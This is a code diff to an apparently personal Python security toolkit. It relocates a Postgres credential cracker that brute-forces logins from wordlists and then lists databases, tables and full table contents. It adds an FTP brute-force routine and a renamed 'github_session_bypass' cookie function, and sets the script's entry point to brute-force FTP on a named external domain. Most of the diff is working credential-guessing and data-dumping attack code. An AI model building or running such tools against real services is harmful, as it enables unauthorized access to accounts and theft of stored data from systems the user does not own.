@@ -13,10 +13,13 @@ import json
 import smtplib, ssl
 import platform
 import psycopg2
+import ftplib
 
 from requests.api import head
 
 class Examples:
+
+    # ACTIVE SCAN
 
     @staticmethod
     def run_console_command(command):
@@ -62,7 +65,7 @@ class Examples:
                     print(f"\rRequest to: {word.ljust(100)}", end="")
 
     @staticmethod
-    def github_session(user_session = None):
+    def github_session_bypass(user_session = None):
         cookies = {
             "user_session" : user_session
         }
@@ -172,6 +175,134 @@ class Examples:
                 for port in ports:
                     print(f"port : {port}\tstate : {n[host][proto][port]['state']}")
 
+    class PostgresCracker:
+
+        def __init__(self, hostname, user_wordlist, pass_wordlist, port=5432, default_db = "postgres"):
+            self.hostname = hostname
+            self.port = port
+            self.user_wordlist = user_wordlist
+            self.pass_wordlist = pass_wordlist
+            self.db_name = default_db
+
+            self.username = None
+            self.password = None
+            self.connection = None
+            self.databases = None
+
+        def _connect_db(self, _user, _pass, db_name = None):
+            try:
+                connection = psycopg2.connect(
+                    user = _user,
+                    password = _pass,
+                    host = self.hostname,
+                    port = str(self.port),
+                    database = self.db_name if not db_name else db_name
+                )
+                return connection
+            except psycopg2.OperationalError:
+                return None
+
+        def crack_credentials(self):
+            with open(self.user_wordlist) as userlist:
+                for user in userlist:
+                    user = user.strip()
+                    with open(self.pass_wordlist) as passlist:
+                        for passwd in passlist:
+                            passwd = passwd.strip()
+
+                            print(f"\rTrying '{user}':'{passwd}'".ljust(50), end="")
+                            con = self._connect_db(user, passwd)
+                            if con:
+                                self.username = user
+                                self.password = passwd
+                                self.connection = con
+                                print("\n\n--- CREDENTIALS ---")
+                                print(f"  USER: '{user}'\n  PASS: '{passwd}'")
+                                return
+
+        def list_databases(self):
+            if not self.connection:
+                print("You should crack credentials first!")
+                return
+
+            cursor = self.connection.cursor()
+            cursor.execute("SELECT datname FROM pg_database where datistemplate = false;")
+            self.databases = [k[0] for k in cursor.fetchall()]
+            cursor.close()
+
+            print("\n--- DATABASES ---")
+            print("  " + "\n  ".join(self.databases))
+
+        def change_database(self, db_name):
+            con = self._connect_db(self.username, self.password, db_name)
+            if con:
+                self.connection = con
+                print(f"\nDatabase changed to {db_name}")
+            else:
+                print(f"\nCould not connect to {db_name}")
+
+        def list_database_tables(self):
+            if not self.connection:
+                print("You should crack credentials first!")
+                return
+
+            cursor = self.connection.cursor()
+            cursor.execute("select table_catalog, table_schema, table_name from information_schema.tables where table_schema = 'public';")
+            tables = [k[2] for k in cursor.fetchall()]
+            cursor.close()
+
+            print("\n--- TABLES ---")
+            print("  " + "\n  ".join(tables))
+
+        def print_table_content(self, table_name):
+            if not self.connection:
+                print("You should crack credentials first!")
+                return
+
+            cursor = self.connection.cursor()
+            cursor.execute(f"""select * from "{table_name}";""")
+            colnames = [desc[0] for desc in cursor.description]
+            content = cursor.fetchall()
+            cursor.close()
+
+            print("\n--- TABLE CONTENT ---\n")
+
+            print(" ".join([k.ljust(15) for k in colnames]))
+            print(("-" * 15 + " ") * len(colnames))
+            for item in content:
+                print(" ".join([str(k).ljust(15) for k in item]))
+
+    @staticmethod
+    def ftp_brute_force(host, port:int, username_wordlist, pass_wordlist):
+        ftp = ftplib.FTP()
+
+        try:
+            ftp.connect(host, port)
+            print("+ Connected to FTP server.")
+        except Exception as exp:
+            print("- Cannot connect to FTP server!")
+            print(exp)
+            return
+
+        with open(username_wordlist) as userlist:
+            for user in userlist:
+                user = user.strip()
+                
+                with open(pass_wordlist) as passlist:
+                    for passwd in passlist:
+                        passwd = passwd.strip()
+
+                        print(f"\r- Trying '{user}':'{passwd}'".ljust(50), end="")
+                        try:
+                            ftp.connect(host, port)
+                            ftp.login(user, passwd)
+                            print(f"\n+ FOUND! Username: '{user}' - Password: '{passwd}'")
+                            return
+                        except:
+                            pass
+
+    # SYSTEM RESARCH
+
     @staticmethod
     def file_finder(path, search_keyword, output_file = None):
         if output_file:
@@ -187,6 +318,8 @@ class Examples:
                         print(f"\rFOUND : {_path}".ljust(100))
         if output_file:
             file.close()
+
+    # CRYPTOGRAPHY
 
     @staticmethod
     def create_wordlist(length, output_file, letters:str = None):
@@ -258,6 +391,8 @@ class Examples:
         
         print("Password not found!")
                     
+    # DEFANSIVE SECURITY
+
     @staticmethod
     def convert_csv_to_json(src_path, dest_path):
         values = []
@@ -391,110 +526,8 @@ class Examples:
         else:
             print(f"'{asset}' is down!")
 
-    class PostgresCracker:
-
-        def __init__(self, hostname, user_wordlist, pass_wordlist, port=5432, default_db = "postgres"):
-            self.hostname = hostname
-            self.port = port
-            self.user_wordlist = user_wordlist
-            self.pass_wordlist = pass_wordlist
-            self.db_name = default_db
-
-            self.username = None
-            self.password = None
-            self.connection = None
-            self.databases = None
-
-        def _connect_db(self, _user, _pass, db_name = None):
-            try:
-                connection = psycopg2.connect(
-                    user = _user,
-                    password = _pass,
-                    host = self.hostname,
-                    port = str(self.port),
-                    database = self.db_name if not db_name else db_name
-                )
-                return connection
-            except psycopg2.OperationalError:
-                return None
-
-        def crack_credentials(self):
-            with open(self.user_wordlist) as userlist:
-                for user in userlist:
-                    user = user.strip()
-                    with open(self.pass_wordlist) as passlist:
-                        for passwd in passlist:
-                            passwd = passwd.strip()
-
-                            print(f"\rTrying '{user}':'{passwd}'".ljust(50), end="")
-                            con = self._connect_db(user, passwd)
-                            if con:
-                                self.username = user
-                                self.password = passwd
-                                self.connection = con
-                                print("\n\n--- CREDENTIALS ---")
-                                print(f"  USER: '{user}'\n  PASS: '{passwd}'")
-                                return
-
-        def list_databases(self):
-            if not self.connection:
-                print("You should crack credentials first!")
-                return
-
-            cursor = self.connection.cursor()
-            cursor.execute("SELECT datname FROM pg_database where datistemplate = false;")
-            self.databases = [k[0] for k in cursor.fetchall()]
-            cursor.close()
-
-            print("\n--- DATABASES ---")
-            print("  " + "\n  ".join(self.databases))
-
-        def change_database(self, db_name):
-            con = self._connect_db(self.username, self.password, db_name)
-            if con:
-                self.connection = con
-                print(f"\nDatabase changed to {db_name}")
-            else:
-                print(f"\nCould not connect to {db_name}")
-
-        def list_database_tables(self):
-            if not self.connection:
-                print("You should crack credentials first!")
-                return
-
-            cursor = self.connection.cursor()
-            cursor.execute("select table_catalog, table_schema, table_name from information_schema.tables where table_schema = 'public';")
-            tables = [k[2] for k in cursor.fetchall()]
-            cursor.close()
-
-            print("\n--- TABLES ---")
-            print("  " + "\n  ".join(tables))
-
-        def print_table_content(self, table_name):
-            if not self.connection:
-                print("You should crack credentials first!")
-                return
-
-            cursor = self.connection.cursor()
-            cursor.execute(f"""select * from "{table_name}";""")
-            colnames = [desc[0] for desc in cursor.description]
-            content = cursor.fetchall()
-            cursor.close()
-
-            print("\n--- TABLE CONTENT ---\n")
-
-            print(" ".join([k.ljust(15) for k in colnames]))
-            print(("-" * 15 + " ") * len(colnames))
-            for item in content:
-                print(" ".join([str(k).ljust(15) for k in item]))
-
 if __name__ == "__main__":
-    cracker = Examples.PostgresCracker("localhost", "wordlists/wordlist.txt", "wordlists/wordlist.txt")
-    cracker.crack_credentials()
-    cracker.list_databases()
-    cracker.change_database("main")
-    cracker.list_database_tables()
-    cracker.print_table_content("user")
+    Examples.ftp_brute_force("serhatsonmez.net", 2121, "wordlists/wordlist.txt", "wordlists/wordlist.txt")
 
 """
 HASH Examples:
